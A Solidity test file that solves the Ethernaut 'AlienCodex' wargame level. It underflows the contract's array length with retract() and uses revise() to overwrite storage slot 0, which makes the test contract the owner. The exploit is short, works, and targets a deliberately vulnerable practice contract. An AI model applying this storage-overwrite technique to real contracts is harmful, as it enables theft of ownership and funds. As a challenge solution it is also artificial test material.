//SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "./utils/DSEthernautTest-05.sol";
import "../src/factories/AlienCodexFactory.sol";
import "../src/levels/AlienCodex.sol";

contract AlienCodexTest is DSEthernautTest {
    function setUp() public {
	super.setUp();
	AlienCodexFactory factory = new AlienCodexFactory();
	ethernaut.registerLevel(factory);
	levelAddress = ethernaut.createLevelInstance(factory);
    }

    function testSolveAlienFactory() public {
	address payable payableLevelAddress = address(uint160(levelAddress));
	AlienCodex instance = AlienCodex(payableLevelAddress);
	instance.makeContact();
	instance.retract();
	uint256 bytes32ArraySlot = 1;
	uint256 codexStorageSlot = uint256(keccak256(abi.encode(bytes32ArraySlot)));
	uint256 uint256Max = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;
	instance.revise(uint256Max - codexStorageSlot + 1, bytes32(uint256(uint160(address(this)))));
	assert(ethernaut.submitLevelInstance(payableLevelAddress));
    }
}
